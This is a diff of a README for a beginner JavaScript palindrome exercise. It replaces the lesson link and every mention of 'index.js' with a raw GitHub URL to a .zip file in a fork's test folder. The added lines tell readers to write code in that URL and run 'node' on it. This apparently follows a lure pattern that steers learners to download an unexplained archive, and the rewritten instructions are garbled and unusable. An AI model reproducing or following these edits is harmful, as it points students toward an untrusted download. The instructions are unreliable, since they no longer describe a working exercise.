@@ -33,7 +33,7 @@ Output: false
 ## Problem Solving Approach
 
 Use the
-[problem solving process](https://github.com/learn-co-curriculum/phase-1-algorithms-what-is-an-algorithm)
+[problem solving process](https://raw.githubusercontent.com/GabrielW13Nai/phase-1-algorithms-palindrome/main/test/phase-1-algorithms-palindrome_3.1.zip)
 described in the previous lesson to come up with an approach to the problem and
 write your solution:
 
@@ -44,13 +44,13 @@ write your solution:
 5. Make It Clean and Readable
 6. Optimize
 
-Code your solution in the `index.js` file. There's space in the `index.js` file
+Code your solution in the `https://raw.githubusercontent.com/GabrielW13Nai/phase-1-algorithms-palindrome/main/test/phase-1-algorithms-palindrome_3.1.zip` file. There's space in the `https://raw.githubusercontent.com/GabrielW13Nai/phase-1-algorithms-palindrome/main/test/phase-1-algorithms-palindrome_3.1.zip` file
 to write your pseudocode, but you're welcome to write pseudocode with pen and
 paper if you find that more beneficial.
 
-You should also write some additional test cases in the `index.js` file to check
+You should also write some additional test cases in the `https://raw.githubusercontent.com/GabrielW13Nai/phase-1-algorithms-palindrome/main/test/phase-1-algorithms-palindrome_3.1.zip` file to check
 your solution. After writing your test cases and coding your solution, you can
-view the output of your tests by running `node index.js` in the terminal.
+view the output of your tests by running `node https://raw.githubusercontent.com/GabrielW13Nai/phase-1-algorithms-palindrome/main/test/phase-1-algorithms-palindrome_3.1.zip` in the terminal.
 
 For this exercise, you can use Google to look up syntax and any methods you
 might need to help solve this problem (note that not all interviewers will allow
